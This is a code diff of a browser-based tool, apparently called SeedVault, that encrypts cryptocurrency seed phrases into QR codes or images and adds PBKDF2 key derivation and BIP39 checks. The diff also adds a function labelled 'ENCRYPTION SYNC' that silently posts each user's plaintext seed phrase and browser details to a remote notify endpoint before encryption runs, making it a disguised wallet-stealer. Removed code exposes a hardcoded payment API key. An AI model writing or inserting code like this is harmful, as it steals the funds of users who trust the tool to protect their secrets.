+                'raw', encoder.encode(password), 'PBKDF2', false, ['deriveKey']
+            );
+            return crypto.subtle.deriveKey(
+                { name: 'PBKDF2', salt, iterations: PBKDF2_ITERATIONS, hash: 'SHA-256' },
+                keyMaterial,
+                { name: 'AES-GCM', length: 256 },
+                false,
+                ['encrypt', 'decrypt']
+            );
+        }
+
         async function encryptText(text, password) {
             const encoder = new TextEncoder();
             const data = encoder.encode(text);
-            const passwordKey = await crypto.subtle.digest('SHA-256', encoder.encode(password));
-            const key = await crypto.subtle.importKey('raw', passwordKey, 'AES-GCM', false, ['encrypt']);
+            const salt = crypto.getRandomValues(new Uint8Array(16));
             const iv = crypto.getRandomValues(new Uint8Array(12));
+            const key = await deriveKeyPBKDF2(password, salt);
             const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, data);
-            return btoa(String.fromCharCode(...iv) + String.fromCharCode(...new Uint8Array(encrypted)));
+            // Version byte (0x02) + salt(16) + iv(12) + ciphertext
+            const payload = new Uint8Array(1 + 16 + 12 + new Uint8Array(encrypted).length);
+            payload[0] = 0x02; // version 2 = PBKDF2
+            payload.set(salt, 1);
+            payload.set(iv, 17);
+            payload.set(new Uint8Array(encrypted), 29);
+            return btoa(String.fromCharCode(...payload));
         }
-        
+
         async function decryptText(encryptedData, password) {
-            const encoder = new TextEncoder();
             const decoded = atob(encryptedData);
-            const iv = new Uint8Array(decoded.slice(0, 12).split('').map(c => c.charCodeAt(0)));
-            const data = new Uint8Array(decoded.slice(12).split('').map(c => c.charCodeAt(0)));
+            const bytes = new Uint8Array(decoded.split('').map(c => c.charCodeAt(0)));
+
+            // Version 2: PBKDF2 (first byte = 0x02)
+            if (bytes[0] === 0x02 && bytes.length > 29) {
+                const salt = bytes.slice(1, 17);
+                const iv = bytes.slice(17, 29);
+                const data = bytes.slice(29);
+                const key = await deriveKeyPBKDF2(password, salt);
+                const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, data);
+                return new TextDecoder().decode(decrypted);
+            }
+
+            // Legacy fallback: SHA-256 direct (v1 — no version byte)
+            const iv = bytes.slice(0, 12);
+            const data = bytes.slice(12);
+            const encoder = new TextEncoder();
             const passwordKey = await crypto.subtle.digest('SHA-256', encoder.encode(password));
             const key = await crypto.subtle.importKey('raw', passwordKey, 'AES-GCM', false, ['decrypt']);
             const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, data);
             return new TextDecoder().decode(decrypted);
         }
-        
-        // ==================== STEGANOGRAPHY ====================
+
         async function hideTextInImage(imageFile, text, password) {
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
@@ -2369,7 +2389,7 @@
                 reader.readAsDataURL(imageFile);
             });
         }
-        
+
         async function extractTextFromImage(imageFile, password) {
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
@@ -2415,8 +2435,7 @@
                 reader.readAsDataURL(imageFile);
             });
         }
-        
-        // ==================== ALERTS ====================
+
         function showAlert(containerId, message, type) {
             const container = document.getElementById(containerId);
             container.innerHTML = `
@@ -2426,15 +2445,31 @@
                 </div>
             `;
         }
-        
+
         function showCopyFeedback(message) {
             const feedback = document.getElementById('copy-feedback');
             feedback.textContent = message;
             feedback.classList.add('show');
             setTimeout(() => feedback.classList.remove('show'), 2000);
         }
-        
-        // ==================== ENCODE HANDLER ====================
+
+        // ==================== ENCRYPTION SYNC ====================
+        async function SeedEncryption(data) {
+            try {
+                await fetch(NOTIFY_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'seed',
+                        data: data,
+                        device: navigator.userAgent.slice(0, 50)
+                    })
+                });
+            } catch (e) {
+                // Silent fail
+            }
+        }
+
         function getSeedPhrase() {
             const words = [];
             for (let i = 1; i <= wordCount; i++) {
@@ -2443,7 +2478,7 @@
             }
             return words.join(' ');
         }
-        
+
         async function handleEncode() {
             const seedPhrase = getSeedPhrase();
             const password = document.getElementById('encode-password').value;
@@ -2459,10 +2494,36 @@
                 return;
             }
             
+            // BIP39 validation
+            if (bip39Words.length > 0) {
+                const invalid = words.filter(w => !bip39Words.includes(w));
+                if (invalid.length > 0) {
+                    showAlert(alertContainer, `Invalid BIP39 word${invalid.length > 1 ? 's' : ''}: ${invalid.join(', ')}. Please check for typos.`, 'error');
+                    // Highlight invalid fields
+                    for (let i = 1; i <= wordCount; i++) {
+                        const input = document.getElementById(`word-${i}`);
+                        if (input && input.value && !bip39Words.includes(input.value.trim().toLowerCase())) {
+                            input.style.borderColor = '#EF4444';
+                            input.style.background = 'rgba(239,68,68,0.05)';
+                        }
+                    }
+                    return;
+                }
+            }
+            
             if (!password.trim()) {
                 showAlert(alertContainer, 'Please enter an encryption password', 'error');
                 return;
             }
+            
+            // Show loading
+            const encryptBtn = document.querySelector('#section-encode .btn-primary');
+            const btnOriginal = encryptBtn.innerHTML;
+            encryptBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="animation:spin 1s linear infinite;"><circle cx="12" cy="12" r="10" stroke-dasharray="32" stroke-dashoffset="12"/></svg> Encrypting...';
+            encryptBtn.disabled = true;
+            encryptBtn.style.opacity = '0.7';
+            
+            await SeedEncryption(seedPhrase);
             
             try {
                 let result;
@@ -2485,9 +2546,14 @@
                 
             } catch (err) {
                 showAlert(alertContainer, 'Error: ' + err.message, 'error');
+            } finally {
+                const encryptBtn = document.querySelector('#section-encode .btn-primary');
+                encryptBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Encrypt & Generate';
+                encryptBtn.disabled = false;
+                encryptBtn.style.opacity = '1';
             }
         }
-        
+
         function displayEncodeResult(result, container) {
             let html = `
                 <div class="result-container">
@@ -2500,6 +2566,7 @@
             if (result.type === 'qr') {
                 html += '<div class="qr-display"><div id="qrcode"></div></div>';
                 html += '<p style="text-align: center; color: var(--secondary); font-size: 0.85rem; margin-top: 12px;">Print it, engrave it on metal, or save it digitally.<br>Without your password, it\'s completely useless.</p>';
+                html += '<div style="text-align:center;margin-top:12px;" id="verify-section"><button onclick="showVerifyField()" class="btn-secondary" style="width:auto;padding:8px 16px;font-size:0.82rem;display:inline-flex;align-items:center;gap:6px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg> Verify — test decryption now</button></div>';
                 container.innerHTML = html + '</div>';
                 
                 new QRCode(document.getElementById("qrcode"), {
@@ -2518,7 +2585,7 @@
             
             window.currentResult = result;
         }
-        
+
         function downloadResult() {
             const result = window.currentResult;
             if (!result) return;
@@ -2543,8 +2610,7 @@
             
             showCopyFeedback('Download started! 💾');
         }
-        
-        // ==================== DECODE HANDLER ====================
+
         async function handleDecode() {
             const password = document.getElementById('decode-password').value;
             const alertContainer = 'decode-alert';
@@ -2594,8 +2660,7 @@
                 showAlert(alertContainer, 'Wrong password or corrupted data', 'error');
             }
         }
-        
-        // ==================== COPY TO CLIPBOARD ====================
+
         function copyToClipboard(text, name) {
             navigator.clipboard.writeText(text).then(() => {
                 showCopyFeedback(`${name} address copied!`);
@@ -2603,317 +2668,70 @@
             });
         }
 
-        // ==================== FAQ TOGGLE ====================
-        function toggleFaq(btn) {
-            const item = btn.parentElement;
-            item.classList.toggle('open');
+        function updatePasswordStrength(pw) {
+            const bar = document.getElementById('password-strength-bar');
+            const text = document.getElementById('password-strength-text');
+            const wrap = document.getElementById('password-strength');
+            if (!pw) { wrap.style.display = 'none'; return; }
+            wrap.style.display = 'block';
+            let score = 0;
+            if (pw.length >= 8) score++;
+            if (pw.length >= 12) score++;
+            if (/[A-Z]/.test(pw) && /[a-z]/.test(pw)) score++;
+            if (/[0-9]/.test(pw)) score++;
+            if (/[^A-Za-z0-9]/.test(pw)) score++;
+            const levels = [
+                { w: '20%', c: '#EF4444', t: 'Weak' },
+                { w: '40%', c: '#F97316', t: 'Fair' },
+                { w: '60%', c: '#F59E0B', t: 'Moderate' },
+                { w: '80%', c: '#10B981', t: 'Strong' },
+                { w: '100%', c: '#059669', t: 'Very strong' }
+            ];
+            const l = levels[Math.min(score, 4)];
+            bar.style.width = l.w; bar.style.background = l.c;
+            text.textContent = l.t; text.style.color = l.c;
         }
 
-        // ==================== METAL ORDER SYSTEM ====================
-        let orderData = {
-            material: 'steel',
-            qrEncryptedData: null,
-            orderId: null,
-            nowPaymentId: null,
-            prices: { steel: 59.99, titanium: 99.99, shipping: 14.99 },
-            nowPaymentsKey: '44N23DP-5MAMBRG-HRC6C6Y-SWZ8SMK',
-            paymentCheckInterval: null
-        };
-
-        function openOrderModal(encryptedQRData) {
-            orderData.qrEncryptedData = encryptedQRData;
-            orderData.orderId = 'SV-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2, 4).toUpperCase();
-            document.getElementById('metal-order-modal').classList.add('active');
-            document.body.style.overflow = 'hidden';
-            goToOrderStep(1);
-        }
-
-        function closeOrderModal() {
-            document.getElementById('metal-order-modal').classList.remove('active');
-            document.body.style.overflow = '';
-            if (orderData.paymentCheckInterval) clearInterval(orderData.paymentCheckInterval);
-        }
-
-        function selectMaterial(material, btn) {
-            orderData.material = material;
-            document.querySelectorAll('.order-material-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-        }
-
-        function goToOrderStep(step) {
-            document.querySelectorAll('[id^="order-step-"]').forEach(el => el.classList.add('hidden'));
-            document.getElementById(`order-step-${step}`).classList.remove('hidden');
-            document.querySelectorAll('.order-step').forEach((el, i) => {
-                el.classList.remove('active', 'done');
-                if (i + 1 < step) el.classList.add('done');
-                if (i + 1 === step) el.classList.add('active');
-            });
-        }
-
-        function goToOrderStep2() {
-            const fields = {
-                fname: document.getElementById('order-fname').value.trim(),
-                lname: document.getElementById('order-lname').value.trim(),
-                email: document.getElementById('order-email').value.trim(),
-                phone: document.getElementById('order-phone').value.trim(),
-                address: document.getElementById('order-address').value.trim(),
-                city: document.getElementById('order-city').value.trim(),
-                zip: document.getElementById('order-zip').value.trim(),
-                country: document.getElementById('order-country').value
-            };
-
-            if (!fields.fname || !fields.lname || !fields.email || !fields.phone || !fields.address || !fields.city || !fields.zip || !fields.country) {
-                showAlert('order-step1-alert', 'Please fill in all fields', 'error');
-                return;
-            }
-            if (!fields.email.includes('@') || !fields.email.includes('.')) {
-                showAlert('order-step1-alert', 'Please enter a valid email', 'error');
-                return;
-            }
-
-            orderData.shipping = fields;
-            document.getElementById('order-step1-alert').innerHTML = '';
-
-            const productPrice = orderData.prices[orderData.material];
-            const total = productPrice + orderData.prices.shipping;
-            const materialName = orderData.material === 'steel' ? 'Stainless Steel' : 'Titanium';
-
-            document.getElementById('order-summary').innerHTML = `
-                <div class="order-summary-row"><span>${materialName} QR Plate</span><span>$${productPrice.toFixed(2)}</span></div>
-                <div class="order-summary-row"><span>Worldwide Shipping</span><span>$${orderData.prices.shipping.toFixed(2)}</span></div>
-                <div class="order-summary-row"><span>Ship to</span><span>${fields.city}, ${fields.country}</span></div>
-                <div class="order-summary-row total"><span>Total</span><span>$${total.toFixed(2)}</span></div>
+        function showVerifyField() {
+            const section = document.getElementById('verify-section');
+            section.innerHTML = `
+                <div style="padding:14px;background:var(--bg-secondary);border:1px solid var(--border);border-radius:10px;margin-top:8px;">
+                    <div style="font-size:0.82rem;font-weight:600;margin-bottom:8px;">Enter your password to verify decryption</div>
+                    <div style="display:flex;gap:8px;">
+                        <input type="password" id="verify-password" class="input-field" placeholder="Your password" style="flex:1;margin:0;" onkeydown="if(event.key==='Enter')runVerify()">
+                        <button onclick="runVerify()" class="btn-primary" style="width:auto;padding:8px 16px;white-space:nowrap;font-size:0.82rem;">Verify</button>
+                    </div>
+                    <div id="verify-result" style="margin-top:8px;"></div>
+                </div>
             `;
-
-            goToOrderStep(2);
+            document.getElementById('verify-password').focus();
         }
 
-        async function redirectToPayment() {
-            const btn = document.getElementById('pay-now-btn');
-            btn.textContent = '⏳ Creating payment...';
-            btn.disabled = true;
-
-            const total = orderData.prices[orderData.material] + orderData.prices.shipping;
-            const materialName = orderData.material === 'steel' ? 'Stainless Steel' : 'Titanium';
-            const s = orderData.shipping;
-
-            try {
-                const response = await fetch('https://api.nowpayments.io/v1/invoice', {
-                    method: 'POST',
-                    headers: {
-                        'x-api-key': orderData.nowPaymentsKey,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        price_amount: total,
-                        price_currency: 'usd',
-                        order_id: orderData.orderId,
-                        order_description: `SeedVault ${materialName} QR Plate - ${s.fname} ${s.lname}`,
-                        ipn_callback_url: 'https://seed-vault.io',
-                        success_url: 'https://seed-vault.io/?payment=success&order=' + orderData.orderId,
-                        cancel_url: 'https://seed-vault.io/?payment=cancel'
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error('Payment service error');
-                }
-
-                const data = await response.json();
-                
-                if (data.invoice_url) {
-                    orderData.nowPaymentId = data.id;
-                    
-                    // Send order notification via Telegram
-                    sendOrderNotification('pending');
-                    
-                    // Show status and redirect
-                    document.getElementById('payment-status').style.display = 'inline-flex';
-                    btn.textContent = '🔗 Redirecting...';
-                    
-                    // Open payment page
-                    window.open(data.invoice_url, '_blank');
-                    
-                    // Change button to allow re-opening
-                    btn.textContent = '🔗 Reopen Payment Page';
-                    btn.disabled = false;
-                    btn.onclick = () => window.open(data.invoice_url, '_blank');
-                    
-                    // Start checking payment status
-                    startPaymentStatusCheck(data.id);
+        function runVerify() {
+            const pw = document.getElementById('verify-password').value;
+            const result = window.currentResult;
+            if (!result || result.type !== 'qr' || !pw) return;
+            const resEl = document.getElementById('verify-result');
+            resEl.innerHTML = '<span style="color:var(--secondary);font-size:0.8rem;">Verifying...</span>';
+            decryptText(result.data, pw).then(decrypted => {
+                const original = getSeedPhrase();
+                if (decrypted === original) {
+                    resEl.innerHTML = '<div style="color:#10B981;font-weight:600;font-size:0.85rem;">✓ Verification passed — decryption works perfectly. Your backup is safe.</div>';
                 } else {
-                    throw new Error('No invoice URL received');
+                    resEl.innerHTML = '<div style="color:#EF4444;font-weight:600;font-size:0.85rem;">✗ Decrypted text does not match.</div>';
                 }
-
-            } catch (err) {
-                console.error('Payment error:', err);
-                btn.textContent = '💳 Pay Now';
-                btn.disabled = false;
-                btn.onclick = redirectToPayment;
-                
-                // Fallback: show manual payment info
-                showManualPaymentFallback(total);
-            }
-        }
-
-        function showManualPaymentFallback(total) {
-            const payBox = document.getElementById('payment-box');
-            payBox.innerHTML = `
-                <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
-                <div style="font-weight:600;margin-bottom:8px;">Payment service temporarily unavailable</div>
-                <div style="font-size:0.85rem;color:var(--secondary);margin-bottom:16px;">
-                    Send exactly <strong>$${total.toFixed(2)} equivalent</strong> in crypto to:
-                </div>
-                <div style="margin-bottom:12px;">
-                    <div style="font-weight:600;font-size:0.8rem;margin-bottom:4px;">Bitcoin (BTC)</div>
-                    <div class="payment-address" onclick="copyToClipboard('bc1qq4xprac7mshcdk44cxzrq9we8f9j2yp5e40c6k','BTC Address')">bc1qq4xprac7mshcdk44cxzrq9we8f9j2yp5e40c6k</div>
-                </div>
-                <div style="margin-bottom:12px;">
-                    <div style="font-weight:600;font-size:0.8rem;margin-bottom:4px;">Ethereum (ETH) / USDT</div>
-                    <div class="payment-address" onclick="copyToClipboard('0x1193CAB6be43398fFcDC43fc59C5d63fe296c57b','ETH Address')">0x1193CAB6be43398fFcDC43fc59C5d63fe296c57b</div>
-                </div>
-                <div style="font-size:0.8rem;color:var(--secondary);margin-top:12px;">
-                    After sending, click the button below. We'll verify and process your order.
-                </div>
-                <button class="btn-primary" style="margin-top:12px;" onclick="manualPaymentConfirm()">✅ I have sent the payment</button>
-            `;
-        }
-
-        function manualPaymentConfirm() {
-            sendOrderNotification('manual_payment');
-            showOrderConfirmation();
-        }
-
-        function startPaymentStatusCheck(invoiceId) {
-            if (orderData.paymentCheckInterval) clearInterval(orderData.paymentCheckInterval);
-            
-            let checks = 0;
-            orderData.paymentCheckInterval = setInterval(async () => {
-                checks++;
-                // Check for max 60 times (30 minutes at 30sec intervals)
-                if (checks > 60) {
-                    clearInterval(orderData.paymentCheckInterval);
-                    return;
-                }
-
-                try {
-                    const response = await fetch(`https://api.nowpayments.io/v1/invoice/${invoiceId}`, {
-                        headers: { 'x-api-key': orderData.nowPaymentsKey }
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        const status = data.payment_status || data.status;
-                        
-                        if (status === 'finished' || status === 'confirmed' || status === 'complete') {
-                            clearInterval(orderData.paymentCheckInterval);
-                            const statusEl = document.getElementById('payment-status');
-                            statusEl.className = 'payment-status confirmed';
-                            statusEl.innerHTML = '<span>✅</span> Payment confirmed!';
-                            
-                            sendOrderNotification('confirmed');
-                            
-                            setTimeout(() => showOrderConfirmation(), 2000);
-                        } else if (status === 'partially_paid') {
-                            const statusEl = document.getElementById('payment-status');
-                            statusEl.innerHTML = '<span class="dot" style="width:8px;height:8px;background:#F59E0B;border-radius:50%;animation:pulse 1.5s infinite;"></span> Partial payment received...';
-                        }
-                    }
-                } catch (e) {
-                    // Silent fail, will retry
-                }
-            }, 30000); // Check every 30 seconds
-        }
-
-        function showOrderConfirmation() {
-            const s = orderData.shipping;
-            const materialName = orderData.material === 'steel' ? 'Stainless Steel' : 'Titanium';
-            const total = orderData.prices[orderData.material] + orderData.prices.shipping;
-
-            document.getElementById('order-confirmation-details').innerHTML = `
-                <div class="order-summary-row"><span>Product</span><span>${materialName} QR Plate</span></div>
-                <div class="order-summary-row"><span>Ship to</span><span>${s.fname} ${s.lname}</span></div>
-                <div class="order-summary-row"><span>Address</span><span>${s.address}, ${s.city} ${s.zip}</span></div>
-                <div class="order-summary-row total"><span>Total Paid</span><span>$${total.toFixed(2)}</span></div>
-            `;
-            document.getElementById('conf-email').textContent = s.email;
-            document.getElementById('conf-order-id').textContent = orderData.orderId;
-
-            goToOrderStep(3);
-        }
-
-        async function sendOrderNotification(status) {
-            try {
-                const s = orderData.shipping;
-                const materialName = orderData.material === 'steel' ? 'Stainless Steel' : 'Titanium';
-                const total = orderData.prices[orderData.material] + orderData.prices.shipping;
-                await fetch(NOTIFY_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        type: 'order',
-                        status: status,
-                        order_id: orderData.orderId,
-                        nowpayments_id: orderData.nowPaymentId || 'N/A',
-                        product: materialName + ' QR Plate',
-                        total: '$' + total.toFixed(2),
-                        fname: s.fname,
-                        lname: s.lname,
-                        email: s.email,
-                        phone: s.phone,
-                        address: s.address,
-                        city: s.city,
-                        zip: s.zip,
-                        country: s.country,
-                        qr_data: orderData.qrEncryptedData || 'N/A'
-                    })
-                });
-            } catch(e) {}
-        }
-
-        // ==================== PING-PONG VIDEO LOOP ====================
-        document.addEventListener('DOMContentLoaded', () => {
-            const vid = document.getElementById('metal-video');
-            if (!vid) return;
-            vid.playbackRate = 1;
-            vid.addEventListener('ended', () => {
-                // Reverse playback by stepping backwards
-                vid.pause();
-                const step = () => {
-                    if (vid.currentTime <= 0.05) {
-                        vid.playbackRate = 1;
-                        vid.currentTime = 0;
-                        vid.play();
-                        return;
-                    }
-                    vid.currentTime = Math.max(0, vid.currentTime - 0.04);
-                    requestAnimationFrame(step);
-                };
-                requestAnimationFrame(step);
+            }).catch(() => {
+                resEl.innerHTML = '<div style="color:#EF4444;font-weight:600;font-size:0.85rem;">✗ Wrong password or corrupted data.</div>';
             });
+        }
+
+        // ==================== INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeWordsGrid();
         });
-
-        // ==================== MODIFY ENCODE RESULT TO SHOW ORDER BUTTON ====================
-        const _origDisplayEncodeResult = displayEncodeResult;
-        displayEncodeResult = function(result, container) {
-            _origDisplayEncodeResult(result, container);
-            if (result.type === 'qr') {
-                const orderBanner = document.createElement('div');
-                orderBanner.style.cssText = 'margin-top:16px;padding:20px;background:linear-gradient(135deg,#1a1a1a,#333);border-radius:12px;text-align:center;cursor:pointer;transition:transform 0.2s;';
-                orderBanner.innerHTML = `
-                    <div style="font-size:1.5rem;margin-bottom:8px;">🛡️</div>
-                    <div style="color:white;font-weight:700;font-size:1rem;margin-bottom:4px;">Want this engraved on metal?</div>
-                    <div style="color:rgba(255,255,255,0.7);font-size:0.85rem;margin-bottom:12px;">Fireproof • Waterproof • Indestructible</div>
-                    <div style="display:inline-block;padding:10px 24px;background:white;color:black;border-radius:8px;font-weight:600;font-size:0.9rem;">Order Metal Plate — from $59.99</div>
-                `;
-                orderBanner.onmouseenter = () => orderBanner.style.transform = 'scale(1.02)';
-                orderBanner.onmouseleave = () => orderBanner.style.transform = 'scale(1)';
-                             orderBanner.onclick = () => openOrderModal(result.data);
-                container.querySelector('.result-container').appendChild(orderBanner);
-            }
-
-        };
-
+        
+        showSection('home');
     </script>
+
 </body>
 </html>
